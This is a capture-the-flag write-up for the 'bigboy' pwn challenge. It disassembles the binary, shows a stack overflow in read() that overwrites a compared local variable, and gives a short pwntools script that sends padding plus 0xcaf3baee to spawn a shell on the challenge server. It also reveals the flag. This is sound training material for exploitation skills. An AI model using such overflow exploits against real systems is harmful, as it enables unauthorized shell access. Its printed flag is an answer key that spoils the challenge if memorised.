# bigboy
Points: 25

## Category
Pwn

## Question
>Only big boi pwners will get this one!
>
>`nc pwn.chal.csaw.io 9000`


## Solution
We are given a file named [boi](distrib/boi).
Using the _file_ command, we are able to deduce that it is a 64-bit ELF executable

```
$ file boi 
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

We can use radare2 to analyse the binary by doing `r2 -d ./boi`.

Do `aa` and `afl` to analyse and list the functions.

Do `s main` to seek to main function and do `pdf` to see the assembler code.

```
$ r2 -d ./boi 
Process with PID 3550 started...
= attach 3550 3550
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x7f215efbf210]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x7f215efbf210]> afl
0x00400498    3 26           sym._init
0x004004d0    1 6            sym.imp.puts
0x004004e0    1 6            sym.imp.__stack_chk_fail
0x004004f0    1 6            sym.imp.system
0x00400500    1 6            sym.imp.read
0x00400510    1 6            sym.imp.__libc_start_main
0x00400520    1 6            fcn.00400520
0x00400530    1 41           entry0
0x00400560    4 50   -> 41   sym.deregister_tm_clones
0x004005a0    3 53           sym.register_tm_clones
0x004005e0    3 28           sym.__do_global_dtors_aux
0x00400600    4 38   -> 35   entry1.init
0x00400626    1 27           sym.run_cmd
0x00400641    6 159          main
0x004006e0    4 101          sym.__libc_csu_init
0x00400750    1 2            sym.__libc_csu_fini
0x00400754    1 9            sym._fini
[0x7f215efbf210]> s main
[0x00400641]>
```

Assembler view
```asm
/ (fcn) main 159
|   main (int arg1, int arg2);
|           ; var int local_40h @ rbp-0x40
|           ; var int local_34h @ rbp-0x34
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_18h @ rbp-0x18
|           ; var int local_8h @ rbp-0x8
|           ; DATA XREF from entry0 (0x40054d)
|           0x00400641      55             push rbp
|           0x00400642      4889e5         mov rbp, rsp
|           0x00400645      4883ec40       sub rsp, 0x40               ; '@'
|           0x00400649      897dcc         mov dword [local_34h], edi  ; arg1
|           0x0040064c      488975c0       mov qword [local_40h], rsi  ; arg2
|           0x00400650      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ; '(' ; 40
|           0x00400659      488945f8       mov qword [local_8h], rax
|           0x0040065d      31c0           xor eax, eax
|           0x0040065f      48c745d00000.  mov qword [local_30h], 0
|           0x00400667      48c745d80000.  mov qword [local_28h], 0
|           0x0040066f      48c745e00000.  mov qword [local_20h], 0
|           0x00400677      c745e8000000.  mov dword [local_18h], 0
|           0x0040067e      c745e4efbead.  mov dword [local_1ch], 0xdeadbeef
|           0x00400685      bf64074000     mov edi, str.Are_you_a_big_boiiiii ; 0x400764 ; "Are you a big boiiiii??"
|           0x0040068a      e841feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x0040068f      488d45d0       lea rax, qword [local_30h]
|           0x00400693      ba18000000     mov edx, 0x18               ; 24
|           0x00400698      4889c6         mov rsi, rax
|           0x0040069b      bf00000000     mov edi, 0
|           0x004006a0      e85bfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
|           0x004006a5      8b45e4         mov eax, dword [local_1ch]
|           0x004006a8      3deebaf3ca     cmp eax, 0xcaf3baee
|       ,=< 0x004006ad      750c           jne 0x4006bb
|       |   0x004006af      bf7c074000     mov edi, str.bin_bash       ; 0x40077c ; "/bin/bash"
|       |   0x004006b4      e86dffffff     call sym.run_cmd
|      ,==< 0x004006b9      eb0a           jmp 0x4006c5
|      |`-> 0x004006bb      bf86074000     mov edi, str.bin_date       ; 0x400786 ; "/bin/date"
|      |    0x004006c0      e861ffffff     call sym.run_cmd
|      |    ; CODE XREF from main (0x4006b9)
|      `--> 0x004006c5      b800000000     mov eax, 0
|           0x004006ca      488b4df8       mov rcx, qword [local_8h]
|           0x004006ce      6448330c2528.  xor rcx, qword fs:[0x28]
|       ,=< 0x004006d7      7405           je 0x4006de
|       |   0x004006d9      e802feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       `-> 0x004006de      c9             leave
\           0x004006df      c3             ret
```

From the assembly code, we can tell that it is trying to compare the value _0xdeadbeef_ to _0xcaf3baee_.

Upon closer inspection of the binary, we see that there is a _read()_ function which will give us a way to overflow the stack with our own values.

To find out how much padding we need, we can use a simple pattern such as the alphabet:
_AAAABBBBCCCCDDDDEEEEFFFFGGGG_

Let's set a breakpoint just before the _cmp_ instruction at address _0x004006a8_ by doing `db 0x004006a8`.

We can now run the program by doing `dc`. We can get the registers at the breakpoint by doing `dr eax`.

```
[0x00400641]> dc
Are you a big boiiiii??
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP
hit breakpoint at: 4006a8
|ERROR| Invalid command 'GGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP' (0x47)
[0x004006a8]> dr eax
0x46464646
[0x004006a8]> 
```

As we can see, the register _eax_ has been overwritten from _0xdeadbeef_ to _0x46464646_. Using Python, we can easily check what character that is

```python
>>> chr(0x46)
'F'
```

Now we can calculate the padding required by finding out the length of characters required before reaching the first _F_

```python
>>> len('AAAABBBBCCCCDDDDEEEE')
20
```

Now we can to overwrite _eax_ with whatever value we want. In this case, they want it to be _0xcaf3baee_. We will need little endian formatting.

Converting _0xcaf3baee_ to little endian we get _\xee\xba\xf3\xca_. This can be done by using the _struct_ module in python

```python
>>> import struct
>>> struct.pack('I', 0xcaf3baee)
'\xee\xba\xf3\xca'
```

Now we can write our exploit script. First we pad using letter 'A's. We figured out previously that the padding is _20_. We also found out that the payload is _\xee\xba\xf3\xca_. We can combine these 2 information and send to the remote server, with the help of pwntools.

```python
from pwn import *

padding = 'A' * 20 # Creates a padding of 20 bytes
payload = p32(0xcaf3baee) # Sets value to overwrite. Similar to struct.pack('I', 0xcaf3baee)
exploit = padding + payload
# Send payload to remote server.
```

Working solution in [solve.py](solve.py)

### Flag
`flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

## Credits
Solved by: [@PlatyPew](https://github.com/PlatyPew)
